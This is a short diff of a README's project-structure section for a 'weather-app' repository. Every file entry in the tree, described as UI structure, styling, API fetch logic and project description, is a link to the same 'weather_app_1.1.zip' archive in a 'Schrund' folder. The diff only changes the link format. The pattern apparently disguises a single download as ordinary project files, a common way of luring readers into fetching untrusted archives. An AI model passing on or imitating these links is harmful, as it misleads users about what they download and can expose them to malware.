@@ -31,7 +31,7 @@ Copy
 Edit
 /weather-app
 │
-├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip       # UI structure
-├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Styling and layout
-├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Weather API fetch logic
-└── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Project description
+├── https://raw.githubusercontent.com/kartik359/weather-app/main/Schrund/weather_app_1.1.zip       # UI structure
+├── https://raw.githubusercontent.com/kartik359/weather-app/main/Schrund/weather_app_1.1.zip        # Styling and layout
+├── https://raw.githubusercontent.com/kartik359/weather-app/main/Schrund/weather_app_1.1.zip        # Weather API fetch logic
+└── https://raw.githubusercontent.com/kartik359/weather-app/main/Schrund/weather_app_1.1.zip        # Project description
